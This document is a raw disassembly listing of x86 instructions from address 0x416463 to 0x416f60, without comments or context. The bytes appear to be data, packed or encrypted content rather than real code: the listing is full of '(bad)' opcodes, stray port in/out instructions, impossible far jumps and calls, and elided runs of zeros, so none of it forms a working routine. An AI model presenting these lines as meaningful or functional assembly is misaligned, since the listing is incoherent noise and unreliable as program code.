  416463:	arpl   WORD PTR [edi-0x186558cc],cx
  416469:	push   edx
  41646a:	jb     0x416484
  41646c:	mov    al,ds:0xadfd21c4
  416471:	push   eax
  416472:	sbb    ch,dh
  416474:	(bad)  
  416476:	cmp    DWORD PTR [ebx+0x5b7eddb8],eax
  41647c:	aas    
  41647d:	push   es
  41647e:	ds pop ebx
  416480:	addr16 pop ebx
  416482:	lods   eax,DWORD PTR ds:[esi]
  416483:	idiv   BYTE PTR [esi-0x20910fae]
  416489:	fcomi  st,st(1)
  41648b:	sub    DWORD PTR [eax],0xaa2ee104
  416491:	mov    ebx,0x5d8f5b7e
  416496:	shl    esp,cl
  416498:	xchg   esi,eax
  416499:	push   edx
  41649a:	push   edx
  41649b:	arpl   di,di
  41649d:	dec    ebx
  41649e:	push   edi
  41649f:	call   0x0:0xdbe7
	...
  4164ca:	add    BYTE PTR [eax],al
  4164cc:	aas    
  4164cd:	pop    ebx
  4164ce:	out    0x83,eax
  4164d0:	cdq    
  4164d1:	adc    eax,DWORD PTR [ecx]
  4164d3:	ja     0x4164e1
  4164d5:	cmc    
  4164d6:	std    
  4164d7:	hlt    
  4164d8:	icebp  
  4164d9:	hlt    
  4164da:	jae    0x4164cd
  4164dc:	cmc    
  4164dd:	xor    esi,DWORD PTR [ecx]
  4164df:	pop    esi
  4164e0:	in     al,dx
  4164e1:	and    al,bl
  4164e3:	in     eax,dx
  4164e4:	cmp    eax,0xb83d898e
  4164e9:	sbb    ch,bh
  4164eb:	sar    DWORD PTR ds:0x963e5481,cl
  4164f1:	pop    esp
  4164f2:	call   0xfe35b844
  4164f7:	pusha  
  4164f8:	jbe    0x4164ea
  4164fa:	push   0x9b78bd
  4164ff:	push   ds
  416500:	jbe    0x41655e
  416502:	call   0xfe367e94
  416507:	push   cs
  416508:	data16 lock std 
  41650b:	jl     0x416542
  41650d:	cld    
  41650e:	or     eax,0xc7f58cba
  416513:	sub    eax,DWORD PTR [ecx+0x5b]
  416516:	push   ebx
  416517:	bound  eax,QWORD PTR [ecx-0x2b1a3b27]
  41651d:	mov    WORD PTR [edx-0x17],gs
  416520:	repz mov ?,ebp
  416523:	pop    esp
  416524:	or     bh,ah
  416526:	scas   eax,DWORD PTR es:[edi]
  416527:	sbb    ebp,DWORD PTR [edi-0xb]
  41652a:	xchg   DWORD PTR [esi+ecx*4],ebp
  41652d:	loope  0x416562
  41652f:	add    BYTE PTR es:[eax],al
	...
  41655a:	mov    dl,0x9a
  41655c:	add    BYTE PTR [edx+0x39],ah
  41655f:	mov    al,ds:0xdb3a2848
  416564:	cmp    eax,0x689ef1e9
  416569:	cmp    eax,0x3e009af3
  41656e:	push   0x26
  416570:	and    cl,ch
  416572:	cmp    eax,0xbb00c060
  416577:	jmp    0xfffd:0x4a85e853
  41657e:	inc    edi
  41657f:	pop    ss
  416580:	(bad)  
  416581:	jmp    DWORD PTR [eax]
  416583:	leave  
  416584:	arpl   WORD PTR gs:[eax+ebx*1-0x2],bp
  416589:	dec    edi
  41658a:	lock or eax,DWORD PTR [esi]
  41658d:	call   0x400ed3
  416592:	call   DWORD PTR [ecx+0x33]
  416595:	inc    DWORD PTR [eax]
  416597:	xchg   esi,eax
  416598:	add    BYTE PTR [esi-0x19],al
  41659b:	dec    eax
  41659c:	add    BYTE PTR [ebp+0x2d],dh
  41659f:	and    edx,edi
  4165a1:	xor    edx,DWORD PTR [edi]
  4165a3:	loopne 0x4165a3
  4165a5:	jmp    DWORD PTR [eax]
  4165a7:	mov    ch,bh
  4165a9:	scas   al,BYTE PTR es:[edi]
  4165aa:	pop    edi
  4165ab:	bound  esi,QWORD PTR [ebx-0x45]
  4165ae:	xor    BYTE PTR [edx+edi*8],cl
  4165b1:	jmp    FWORD PTR [edx-0xa6c1a11]
  4165b7:	mov    edi,esi
  4165b9:	pop    edi
  4165ba:	shl    DWORD PTR ds:0x4bf,1
	...
  4165e8:	pop    ss
  4165e9:	stos   BYTE PTR es:[edi],al
  4165ea:	mov    ch,ah
  4165ec:	xchg   esp,eax
  4165ed:	mov    ds:0xce6283f5,eax
  4165f2:	dec    edx
  4165f3:	inc    ecx
  4165f4:	daa    
  4165f5:	pop    edi
  4165f6:	jae    0x4165fc
  4165f8:	ficomp WORD PTR [eax+0x5a7f0005]
  4165fe:	(bad)  
  4165ff:	jmp    edi
  416601:	xchg   esi,eax
  416602:	or     BYTE PTR ds:0x45888bb0,dh
  416608:	mov    bl,0xa3
  41660a:	inc    esp
  41660b:	clc    
  41660c:	fistp  DWORD PTR [ebp+0x0]
  41660f:	add    BYTE PTR [edx+0x19],dl
  416612:	not    BYTE PTR [eax-0x50]
  416615:	or     edx,edi
  416617:	(bad)  
  416618:	ds dec edi
  41661a:	add    bh,bh
  41661c:	dec    ebx
  41661d:	adc    BYTE PTR [ecx+0x14],dl
  416620:	out    dx,eax
  416621:	sub    eax,0xe7b0ffc1
  416626:	dec    ebp
  416627:	out    0xdd,eax
  416629:	or     DWORD PTR [edx],eax
  41662b:	add    BYTE PTR [ebp+0x3376046c],bh
  416631:	or     al,0x2
  416633:	add    BYTE PTR [ecx+0x156ed9d2],ah
  416639:	ret    
  41663a:	add    edi,edi
  41663c:	or     esp,DWORD PTR [eax-0x73b98bb0]
  416642:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416643:	pop    esp
  416644:	jno    0x416677
  416646:	push   eax
  416647:	je     0x4166b3
  416649:	pushf  
  41664a:	pushf  
  41664b:	xor    eax,DWORD PTR [eax]
	...
  416675:	add    BYTE PTR [ecx+0x41],ah
  416678:	cmp    al,cl
  41667a:	inc    esi
  41667b:	add    al,0xb7
  41667d:	mov    ah,BYTE PTR [edx-0x7b]
  416680:	inc    ebp
  416681:	sti    
  416682:	aam    0x3
  416684:	fcom   QWORD PTR [ebp+0x41]
  416687:	(bad)  
  416688:	stc    
  416689:	out    0xb,eax
  41668b:	mov    bl,0x50
  41668d:	inc    bh
  41668f:	mov    dh,0x4d
  416691:	addr16 mov dl,0xdd
  416694:	ret    0x20ff
  416697:	addr16 stc 
  416699:	out    0x90,eax
  41669b:	stc    
  41669c:	dec    ebp
  41669d:	(bad)  
  41669e:	adc    DWORD PTR [edi-0x36c01b0],eax
  4166a4:	pop    ecx
  4166a5:	test   DWORD PTR [edi+0x21],0xfffcc84e
  4166ac:	add    DWORD PTR [ebp-0x3b],edx
  4166af:	pop    ds
  4166b0:	add    bl,0xea
  4166b3:	popf   
  4166b4:	add    al,0x6a
  4166b6:	mov    ecx,eax
  4166b8:	xlat   BYTE PTR ds:[ebx]
  4166b9:	pop    es
  4166ba:	out    0x5a,al
  4166bc:	adc    DWORD PTR ds:0xc970f1d1,0xffffffc5
  4166c3:	and    bh,0x3
  4166c6:	shl    DWORD PTR [eax-0x63db9501],1
  4166cc:	out    0xdb,eax
  4166ce:	fild   DWORD PTR [ebp+0x67a90428]
  4166d4:	fistp  WORD PTR [ebx-0x48]
  4166d7:	(bad)  
  4166d8:	outs   dx,BYTE PTR ds:[esi]
  4166d9:	dec    edi
	...
  416702:	add    BYTE PTR [eax],al
  416704:	cwde   
  416705:	arpl   WORD PTR [bx+0xa],cx
  416709:	arpl   WORD PTR [edi-0x6f],cx
  41670c:	dec    esi
  41670d:	repnz push esi
  41670f:	cmp    eax,0xb8e7567f
  416714:	(bad)  
  416715:	(bad)  
  416716:	push   0x48
  416718:	lea    ecx,[eax+0x5ef24e96]
  41671e:	aas    
  41671f:	cld    
  416720:	es repnz cs sti 
  416724:	cdq    
  416725:	addr16 in eax,dx
  416727:	scas   al,BYTE PTR es:[edi]
  416728:	repz and ebp,DWORD PTR [edx]
  41672b:	cld    
  41672c:	dec    ecx
  41672d:	fisubr WORD PTR [ebx+edx*2-0x6b0e0f]
  416734:	and    DWORD PTR [ebx+0x65304ec0],esi
  41673a:	daa    
  41673b:	(bad)  
  41673c:	mov    ebp,0x3e03e894
  416741:	lock je 0x416793
  416744:	enter  0xc396,0x34
  416748:	mov    ds:0xe5d8df0f,al
  41674d:	lock pop esp
  41674f:	dec    esp
  416750:	sbb    DWORD PTR [edx],edx
  416752:	sub    ecx,DWORD PTR [edi-0x8]
  416755:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  416757:	xlat   BYTE PTR ds:[ebx]
  416758:	cmp    dl,ah
  41675a:	and    al,0x60
  41675c:	mov    ah,0xeb
  41675e:	add    dl,al
  416760:	shl    ecx,1
  416762:	jae    0x416711
  416764:	jne    0x416755
  416766:	xor    DWORD PTR [esi+0x0],esp
	...
  416790:	add    BYTE PTR [eax],al
  416792:	and    bl,0x43
  416795:	lea    edi,[eax+0x67]
  416798:	cld    
  416799:	xchg   esi,eax
  41679a:	out    0x4,al
  41679c:	(bad)  
  41679d:	adc    al,0xa
  41679f:	clc    
  4167a0:	and    DWORD PTR [ebp-0xb760f00],edi
  4167a6:	or     DWORD PTR [ebx],eax
  4167a8:	loope  0x416793
  4167aa:	cmp    eax,0x7496bd5b
  4167af:	fwait
  4167b0:	add    BYTE PTR [esi+0x945f8cb],bh
  4167b6:	inc    edx
  4167b7:	pop    ebx
  4167b8:	or     DWORD PTR [ecx],ebp
  4167ba:	imul   ebx,DWORD PTR [edx-0x17],0xc02d09fa
  4167c1:	add    BYTE PTR [eax],0xf1
  4167c4:	std    
  4167c5:	movsx  edi,BYTE PTR ds:[eax]
  4167c9:	out    dx,al
  4167ca:	xchg   bh,dh
  4167cc:	out    0x21,eax
  4167ce:	cmp    eax,0xed72005b
  4167d3:	ja     0x4167a7
  4167d5:	xchg   edx,eax
  4167d6:	xor    al,0x53
  4167d9:	add    DWORD PTR [eax+0x50],eax
  4167dc:	add    cl,ch
  4167de:	xor    al,0xb0
  4167e0:	jae    0x4167ce
  4167e2:	xchg   edx,eax
  4167e3:	stos   BYTE PTR es:[edi],al
  4167e4:	add    cl,ch
  4167e6:	cmp    eax,0xa5f9899b
  4167eb:	addr16 call 0x3fc6b972
  4167f1:	jmp    0x9475fc1
	...
  41681e:	add    BYTE PTR [eax],al
  416820:	inc    edx
  416821:	pop    ebx
  416822:	or     DWORD PTR [ecx+0x71e756e9],ebp
  416828:	inc    edx
  416829:	pop    ebx
  41682a:	add    BYTE PTR [eax],al
  41682c:	ins    DWORD PTR es:[edi],dx
  41682d:	out    0xc3,eax
  41682f:	add    bh,dl
  416831:	stos   DWORD PTR es:[edi],eax
  416832:	dec    edi
  416833:	jmp    DWORD PTR [edx]
  416835:	(bad)  
  416836:	in     eax,0x3f
  416838:	or     DWORD PTR [eax+eax*1+0xb],ebx
  41683c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41683d:	adc    dh,BYTE PTR [edx-0x77]
  416840:	and    al,BYTE PTR [ebx-0x71408a02]
  416846:	sbb    eax,DWORD PTR [ebx-0x38]
  416849:	popf   
  41684a:	mov    BYTE PTR [ebp-0x39],al
  41684d:	popf   
  41684e:	je     0x416834
  416850:	sub    BYTE PTR [eax],cl
  416852:	fsubp  st(0),st
  416854:	xchg   edi,eax
  416855:	pop    ss
  416856:	(bad)  
  416857:	call   FWORD PTR [ebx+ebx*4+0x10564f71]
  41685e:	loop   0x41685f
  416860:	xor    dh,BYTE PTR ds:0x6e97416a
  416866:	inc    esp
  416867:	fmul   DWORD PTR [eax]
  416869:	dec    eax
  41686a:	into   
  41686b:	imul   esp,DWORD PTR [esi+0x53458d5b],0x70
  416872:	inc    esp
  416873:	aam    0xc7
  416875:	jo     0x4168bb
  416877:	in     al,0xb7
  416879:	sahf   
  41687a:	je     0x41685c
  41687c:	das    
  41687d:	mov    bh,0x59
  41687f:	jmp    FWORD PTR [eax]
  416881:	repnz mov ebp,0x74
	...
  4168ab:	add    BYTE PTR [eax],al
  4168ad:	add    BYTE PTR [ecx+0x13],dh
  4168b0:	add    DWORD PTR [eax],eax
  4168b2:	cmp    cl,ah
  4168b4:	(bad)  
  4168b5:	jne    0x4168e6
  4168b7:	xchg   ebx,eax
  4168b8:	ret    0x282f
  4168bb:	mov    al,ds:0xa03f75fe
  4168c0:	je     0x4168ca
  4168c2:	aas    
  4168c3:	add    DWORD PTR [esi],ebp
  4168c5:	call   FWORD PTR [eax]
  4168c7:	mov    al,ds:0x5e8e474
  4168cc:	fdivp  st(7),st
  4168ce:	ds (bad) 
  4168d0:	cld    
  4168d1:	out    0xde,eax
  4168d3:	in     eax,dx
  4168d4:	dec    esp
  4168d5:	(bad)  
  4168d6:	icebp  
  4168d7:	das    
  4168d8:	fs out 0xef,eax
  4168db:	repnz dec esp
  4168dd:	inc    BYTE PTR [esp+ecx*2-0x59baf084]
  4168e4:	aad    0x8
  4168e6:	mov    esi,0xc30f01f6
  4168eb:	icebp  
  4168ec:	dec    esp
  4168ed:	inc    cl
  4168ef:	pop    esp
  4168f0:	add    al,BYTE PTR [eax]
  4168f2:	test   eax,0x46744c9e
  4168f7:	int3   
  4168f8:	test   DWORD PTR [esi],ebp
  4168fa:	test   eax,0xa2744c6d
  4168ff:	gs (bad) 
  416901:	neg    DWORD PTR [ecx-0x1d180619]
  416907:	inc    ebp
  416908:	dec    ebx
  416909:	dec    BYTE PTR [ecx-0x3c18a1f9]
  41690f:	push   edx
  416910:	dec    ebx
  416911:	inc    BYTE PTR [eax]
	...
  41693b:	add    bl,cl
  41693d:	mov    bh,0x51
  41693f:	dec    edi
  416940:	data16 mov BYTE PTR [ecx],cl
  416943:	jmp    FWORD PTR [ecx-0x77]
  416946:	add    DWORD PTR [edi+0x0],ebx
  416949:	cmp    edi,DWORD PTR [edi]
  41694b:	pop    es
  41694c:	ds (bad) 
  41694e:	js     0x41693b
  416950:	push   ecx
  416951:	iret   
  416952:	std    
  416953:	(bad)  
  416954:	shr    ebx,cl
  416956:	pop    ecx
  416957:	bound  eax,QWORD PTR [eax+0x45]
  41695a:	dec    esp
  41695b:	enter  0xffc,0x2
  41695f:	push   ebp
  416960:	lds    eax,FWORD PTR [edi+0x4c]
  416963:	je     0x41699f
  416965:	dec    esp
  416966:	fs xor eax,0xbff5e521
  41696c:	xchg   edx,eax
  41696d:	and    DWORD PTR [ebp+0x74],ecx
  416970:	cs pop ebx
  416972:	aaa    
  416973:	pop    esp
  416974:	xchg   edx,eax
  416975:	and    eax,0x83714bde
  41697a:	(bad)  [ecx+0x39]
  41697d:	pop    ebx
  41697e:	into   
  41697f:	ror    DWORD PTR [ecx-0x12],1
  416982:	cmp    al,0xf0
  416984:	jns    0x416974
  416986:	xor    al,0xfc
  416988:	fldenv [esi+0x2d84b10]
  41698e:	inc    eax
  41698f:	push   ss
  416990:	shr    ebp,1
  416992:	mov    al,0x46
  416994:	sub    eax,0xd57f345b
  416999:	and    bh,0x3
  41699c:	test   eax,0x8dffac
	...
  4169c9:	add    BYTE PTR [esp+ebx*4],ah
  4169cc:	out    0x4a,eax
  4169ce:	xor    bl,BYTE PTR [edi+0x11]
  4169d1:	out    dx,al
  4169d2:	mov    al,ds:0xe95bdf67
  4169d7:	in     eax,dx
  4169d8:	outs   dx,BYTE PTR ds:[esi]
  4169d9:	dec    ebx
  4169da:	sbb    DWORD PTR [ebx-0x19],ebx
  4169dd:	pop    edx
  4169de:	retf   
  4169df:	and    BYTE PTR [ecx+0x565afedf],0xd1
  4169e6:	inc    ebp
  4169e7:	sub    ebx,0x4f62ea4a
  4169ed:	ins    DWORD PTR es:[edi],dx
  4169ee:	push   0x61dc3eed
  4169f3:	in     eax,dx
  4169f4:	inc    esi
  4169f5:	mov    ah,cl
  4169f7:	mov    al,0xc2
  4169f9:	les    edx,FWORD PTR [ecx-0x14]
  4169fc:	pushf  
  4169fd:	not    edi
  4169ff:	cmp    DWORD PTR [esi],ebx
  416a01:	sar    DWORD PTR [ecx],1
  416a03:	add    ebp,DWORD PTR [edx+0x4b]
  416a06:	cmp    ch,ch
  416a08:	and    BYTE PTR [esi+0x39],al
  416a0b:	pop    ebx
  416a0c:	pushf  
  416a0d:	jle    0x416a24
  416a0f:	test   BYTE PTR ds:0x5b7edf,ch
  416a15:	cmp    DWORD PTR [esi-0x7f],0x6784e93f
  416a1c:	adc    dh,ah
  416a1e:	sbb    BYTE PTR cs:[ecx+0x28],cl
  416a22:	cmp    al,BYTE PTR [ebx]
  416a24:	adc    al,0x1c
  416a26:	test   ebp,ebp
  416a28:	or     DWORD PTR [ecx-0x4c5eadff],ebp
	...
  416a56:	add    BYTE PTR [eax],al
  416a58:	or     BYTE PTR [eax+eax*1-0x29ef142],bl
  416a5f:	cmp    al,0xda
  416a61:	hlt    
  416a62:	sub    DWORD PTR [esi-0x2302127c],0xb
  416a69:	cmp    DWORD PTR [edi],0x300e65e9
  416a6f:	xchg   esi,eax
  416a70:	add    al,0x23
  416a72:	ret    
  416a73:	fnstsw WORD PTR ds:0xc0958986
  416a79:	sbb    ch,bh
  416a7b:	adc    edi,DWORD PTR [edx]
  416a7d:	adc    DWORD PTR [edi+0x76],0xe9e8546e
  416a84:	xor    al,0xec
  416a86:	std    
  416a87:	jo     0x416b07
  416a89:	lock push 0x9b6620
  416a8f:	shl    DWORD PTR [ecx-0x80],0x3f
  416a93:	jmp    0x5149d19c
  416a98:	fsubr  st,st(4)
  416a9a:	std    
  416a9b:	ds hlt 
  416a9d:	data16 cld 
  416a9f:	outs   dx,BYTE PTR ss:[esi]
  416aa1:	push   esp
  416aa2:	call   0xfe2d9fae
  416aa7:	xor    BYTE PTR [ebx],al
  416aa9:	pop    eax
  416aaa:	add    BYTE PTR [eax+eax*8-0x7ed27e01],dh
  416ab1:	add    BYTE PTR [eax],0x83
  416ab4:	in     eax,0xec
  416ab6:	jae    0x416ab8
  416ab8:	das    
  416ab9:	nop
  416aba:	(bad)  
  416abb:	add    BYTE PTR cs:[eax],al
	...
  416ae6:	and    BYTE PTR [edx+0x11134588],ah
  416aec:	je     0x416b5a
  416aee:	out    0x57,al
  416af0:	push   0xfe18735e
  416af5:	(bad)  
  416af6:	push   0xffffffef
  416af8:	in     eax,0x65
  416afa:	adc    BYTE PTR [edx-0x5c750002],ah
  416b00:	(bad)  
  416b01:	jne    0x416af2
  416b03:	(bad)  
  416b04:	in     eax,dx
  416b05:	mov    al,cs:0xebc2c8a1
  416b0b:	push   edi
  416b0c:	push   ebx
  416b0d:	mov    edx,DWORD PTR [ebx+0x2dfcc1d5]
  416b13:	push   edi
  416b14:	push   0x5a
  416b16:	mov    al,ds:0x3be8061b
  416b1b:	push   ecx
  416b1c:	std    
  416b1d:	call   FWORD PTR [esi]
  416b1f:	lods   al,BYTE PTR ds:[esi]
  416b20:	stc    
  416b21:	push   0xffffff97
  416b23:	btr    DWORD PTR [esi+edx*2+0x57],ebp
  416b28:	push   0xfe184396
  416b2d:	dec    dl
  416b2f:	xchg   esi,eax
  416b30:	inc    ebp
  416b31:	inc    ecx
  416b32:	xchg   edi,eax
  416b33:	(bad)  
  416b34:	push   edi
  416b35:	xor    al,0xe0
  416b37:	mov    eax,ds:0x9bc00a
  416b3c:	dec    esi
  416b3d:	push   0xbeed5767
  416b42:	(bad)  
  416b43:	cdq    
  416b44:	imul   eax,DWORD PTR [ecx+0x57],0x75fea7
	...
  416b73:	add    BYTE PTR [edi-0x71],bl
  416b76:	sbb    DWORD PTR [edx+0x20],ebx
  416b79:	mov    ds:0xa26625e5,al
  416b7e:	(bad)  
  416b7f:	push   0x57
  416b81:	btr    DWORD PTR [esi+edi*1-0x4d],ebp
  416b86:	add    DWORD PTR [eax-0x38],ebp
  416b89:	push   0xf6a1ffc2
  416b8e:	add    DWORD PTR [eax],eax
  416b90:	mov    esi,0x19341f4c
  416b95:	repnz cld 
  416b97:	mov    edi,0x67b20b8a
  416b9c:	ds hlt 
  416b9e:	pop    eax
  416b9f:	mov    ebp,0x40d5c296
  416ba4:	ds and al,0x47
  416ba7:	je     0x416bef
  416ba9:	sbb    al,0x5b
  416bab:	pop    eax
  416bac:	jmp    0x2f32c5d2
  416bb1:	test   eax,0x9c3e6948
  416bb6:	mov    ebp,DWORD PTR [ebx+0x7f]
  416bb9:	hlt    
  416bba:	fst    DWORD PTR [ebp-0xfbcca6]
  416bc0:	or     esi,DWORD PTR [ebp-0x23c1bf47]
  416bc6:	push   esp
  416bc7:	xor    dh,BYTE PTR [ecx+0x32bffcd9]
  416bcd:	sti    
  416bce:	mov    cl,0x67
  416bd0:	ds hlt 
  416bd2:	pop    eax
  416bd3:	mov    ebp,0x40d5ba26
	...
  416c00:	add    BYTE PTR [eax],al
  416c02:	ds inc esp
  416c04:	inc    edi
  416c05:	je     0x416c3d
  416c07:	mov    WORD PTR [esi+0x59898158],cs
  416c0d:	mov    ebp,0x6948912e
  416c12:	ds sbb al,0x8d
  416c15:	imul   edi,edi,0xfffffff3
  416c18:	fst    DWORD PTR [ebp+0x6801b2d2]
  416c1e:	cmp    al,0xf4
  416c20:	add    DWORD PTR [eax-0xebcb9a],eax
  416c26:	dec    ecx
  416c27:	pop    ebx
  416c28:	repnz inc ebx
  416c2a:	int    0x43
  416c2c:	mov    bh,0xdb
  416c2e:	cmp    edx,ebp
  416c30:	push   es
  416c31:	mov    DWORD PTR [ecx+0x29c27c21],ebx
  416c37:	call   0xaa69:0xf339ce06
  416c3e:	sbb    dl,ch
  416c40:	(bad)  
  416c41:	jnp    0x416ca4
  416c43:	jmp    0xd1e6:0xe79247ee
  416c4a:	cmp    ebx,esi
  416c4c:	fstp   QWORD PTR [ecx]
  416c4e:	stc    
  416c4f:	jmp    0x5b7eaef4
  416c54:	xor    al,0x7b
  416c56:	aad    0xdb
  416c58:	stos   DWORD PTR es:[edi],eax
  416c59:	pop    esp
  416c5a:	call   0x431e2b48
  416c5f:	pop    esp
  416c60:	out    0x3,eax
  416c62:	out    0xda,al
  416c64:	test   DWORD PTR [esi+0x0],0x0
	...
  416c8f:	add    al,cl
  416c91:	shr    DWORD PTR [esp+ebx*2-0x38],cl
  416c95:	jmp    0xe743e638
  416c9a:	aaa    
  416c9b:	inc    edi
  416c9c:	sub    dl,BYTE PTR [edi-0x72]
  416c9f:	rol    DWORD PTR [ecx-0xd],1
  416ca2:	ins    DWORD PTR es:[edi],dx
  416ca3:	call   0x44345649
  416ca8:	dec    eax
  416ca9:	loopne 0x416c8d
  416cab:	add    al,0x3e
  416cad:	pop    ebx
  416cae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416caf:	rcl    DWORD PTR [ecx+0x3e03e75a],0x22
  416cb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cb7:	dec    edi
  416cb8:	js     0x416d1b
  416cba:	out    0x3,eax
  416cbc:	in     al,0x5a
  416cbe:	rol    DWORD PTR [ebx],0xd4
  416cc1:	pop    edx
  416cc2:	rol    DWORD PTR [ebx],1
  416cc4:	mov    bl,0x9f
  416cc6:	xor    esi,DWORD PTR [edx+ecx*8+0x13d00df]
  416ccd:	jmp    0x6f4206cf
  416cd2:	clc    
  416cd3:	outs   dx,DWORD PTR es:[esi]
  416cd5:	in     eax,0xe8
  416cd7:	shl    DWORD PTR [ecx],0xe9
  416cda:	std    
  416cdb:	loop   0x416d5a
  416cdd:	ins    BYTE PTR es:[edi],dx
  416cde:	add    eax,DWORD PTR [eax]
  416ce0:	jo     0x416cca
  416ce2:	std    
  416ce3:	jmp    0xa88a36ed
  416ce8:	cmp    eax,0x75e573e8
  416ced:	mov    bl,0x31
  416cef:	out    dx,al
  416cf0:	sbb    BYTE PTR [eax+0xb989],0x0
	...
  416d1b:	add    BYTE PTR [eax],al
  416d1d:	add    BYTE PTR [esi-0x7f290b21],al
  416d23:	jmp    0xc3d3a878
  416d28:	xor    esi,ecx
  416d2a:	adc    bl,0x83
  416d2d:	mov    ecx,0xd1fde970
  416d32:	jo     0x416d6d
  416d34:	std    
  416d35:	mov    dh,0xf7
  416d37:	call   0x9c332aa1
  416d3c:	add    BYTE PTR [esi-0x610a0752],ah
  416d42:	add    cl,ch
  416d44:	jae    0x416d27
  416d46:	adc    eax,0x8e32ea
  416d4b:	rol    DWORD PTR [ebx-0x2170f6b],cl
  416d51:	push   0xffffffc6
  416d53:	hlt    
  416d54:	cmc    
  416d55:	jbe    0x416d4f
  416d57:	out    0x71,eax
  416d59:	sbb    ch,BYTE PTR [edx-0x15]
  416d5c:	ins    BYTE PTR es:[edi],dx
  416d5d:	test   al,0x3d
  416d5f:	call   0xe949bb17
  416d64:	std    
  416d65:	inc    ecx
  416d66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d67:	sub    eax,0x98ad4efd
  416d6c:	push   0x5f5300
  416d71:	add    BYTE PTR [eax],bl
  416d73:	retf   
  416d74:	in     eax,0xf7
  416d76:	or     BYTE PTR [ecx+0x1f9fa165],ah
  416d7c:	(bad)  
  416d7d:	addr16 dec esi
  416d7f:	add    eax,DWORD PTR [ecx+0x0]
	...
  416daa:	add    BYTE PTR [eax],al
  416dac:	iret   
  416dad:	pop    esi
  416dae:	imul   eax,DWORD PTR [ecx+0x27],0xffffff84
  416db2:	aas    
  416db3:	sbb    edx,DWORD PTR [edi]
  416db5:	pop    esp
  416db6:	cmp    eax,0x68161614
  416dbc:	daa    
  416dbd:	pop    esp
  416dbe:	in     eax,dx
  416dbf:	mov    esi,0x416ce9bf
  416dc4:	pop    ss
  416dc5:	mov    eax,ds:0x9de0e8b4
  416dca:	(bad)  
  416dcb:	call   DWORD PTR [edx+0x2f6fe5ef]
  416dd1:	sahf   
  416dd2:	(bad)  
  416dd3:	call   0x3ebc67
  416dd8:	clc    
  416dd9:	pop    ss
  416dda:	push   cs
  416ddb:	call   DWORD PTR [edx-0x71]
  416dde:	idiv   bh
  416de0:	mov    BYTE PTR [ebp-0x7e00f78c],bl
  416de6:	sti    
  416de7:	call   FWORD PTR [eax-0x2f0f4b63]
  416ded:	popf   
  416dee:	(bad)  
  416def:	call   0x3ebc5f
  416df4:	mov    eax,0xb8f7e9d7
  416df9:	popf   
  416dfa:	in     eax,0x51
  416dfc:	mov    BYTE PTR [esi-0x689d0002],bl
  416e02:	call   0xfedf860b
  416e07:	jmp    DWORD PTR [edx-0x61]
  416e0a:	in     eax,0x6d
  416e0c:	cmp    al,0x5f
  416e0e:	add    bh,bh
	...
  416e38:	add    BYTE PTR [eax],al
  416e3a:	ds (bad) 
  416e3c:	pop    esp
  416e3d:	imul   BYTE PTR [ecx-0x68]
  416e40:	pop    esp
  416e41:	xor    eax,0xc843a111
  416e46:	jl     0x416e3d
  416e48:	add    DWORD PTR [ebp-0x3b],edx
  416e4b:	popf   
  416e4c:	jg     0x416e11
  416e4e:	dec    edx
  416e4f:	sbb    eax,DWORD PTR [edx]
  416e51:	push   0xffffffe5
  416e53:	inc    eax
  416e54:	int    0x7
  416e56:	es sbb eax,0x7c31ff16
  416e5c:	mov    ebp,0xf9d029fb
  416e61:	addr16 or al,0xd1
  416e64:	ret    0x18ff
  416e67:	mov    al,0x40
  416e69:	inc    edi
  416e6a:	jg     0x416e60
  416e6c:	pop    ecx
  416e6d:	lea    ecx,[eax]
  416e6f:	test   BYTE PTR [esi+edi*8-0x75],0xec
  416e74:	(bad)  
  416e76:	push   0x33
  416e78:	add    al,0x68
  416e7a:	cmp    al,0xf4
  416e7c:	add    DWORD PTR [eax-0x1b9672a],eax
  416e82:	loope  0x416e10
  416e84:	add    al,0x0
  416e86:	jmp    0x635347f1
  416e8b:	xor    eax,DWORD PTR [eax+ebp*2]
  416e8e:	sub    DWORD PTR [edi],esp
  416e90:	sar    edi,0xc0
  416e93:	inc    edi
  416e94:	cld    
  416e95:	out    0x58,eax
  416e97:	pushf  
  416e98:	inc    ebx
  416e99:	(bad)  
  416e9a:	mov    cl,0x47
  416e9c:	dec    eax
  416e9d:	inc    BYTE PTR [eax]
	...
  416ec7:	add    BYTE PTR [ebx],dh
  416ec9:	cld    
  416eca:	pop    ecx
  416ecb:	push   ebx
  416ecc:	push   edx
  416ecd:	fld    QWORD PTR [eax+ecx*8+0x7c]
  416ed1:	add    BYTE PTR [edx],al
  416ed3:	push   ebp
  416ed4:	(bad)
  416ed7:	ret    
  416ed8:	(bad)  
  416ed9:	ins    DWORD PTR es:[edi],dx
  416eda:	inc    esp
  416edb:	(bad)  
  416edc:	mov    bl,0x5b
  416ede:	lods   al,BYTE PTR ds:[esi]
  416edf:	inc    edi
  416ee0:	or     esi,esp
  416ee2:	aam    0xf7
  416ee4:	jo     0x416f56
  416ee6:	fistp  WORD PTR [ebx+0x55]
  416ee9:	inc    ecx
  416eea:	out    0x3,eax
  416eec:	xor    eax,0x607ef71b
  416ef1:	pop    ecx
  416ef2:	out    0x3,eax
  416ef4:	jns    0x416e96
  416ef6:	das    
  416ef7:	add    edi,DWORD PTR [esi]
  416ef9:	pop    ebx
  416efa:	out    0x3c,eax
  416efc:	cli    
  416efd:	out    dx,al
  416efe:	es cld 
  416f00:	cmp    esi,esp
  416f02:	xchg   ecx,eax
  416f03:	add    esp,DWORD PTR [ebx+ebx*2+0x5b940381]
  416f0a:	pop    esp
  416f0b:	mov    esi,0x7e748b2d
  416f10:	or     eax,0x8143feee
  416f15:	out    0x7c,al
  416f17:	dec    ebx
  416f18:	or     BYTE PTR [eax-0x15],dh
  416f1b:	pop    edx
  416f1c:	ret    
  416f1d:	inc    eax
  416f1e:	out    0x3,eax
  416f20:	inc    ebp
  416f21:	sbb    edx,DWORD PTR [ecx+ecx*1-0x19]
  416f25:	mov    al,0xe9
  416f27:	add    edi,DWORD PTR [esi]
  416f29:	jae    0x416f99
  416f2b:	int3   
	...
  416f54:	add    BYTE PTR [eax],al
  416f56:	jle    0x416fb3
  416f58:	(bad)  
  416f59:	mov    ecx,0xf5eef345
  416f5e:	shl    ch,1
  416f60:	bound  edx,QWORD PTR [edx+edi*4-0x21]
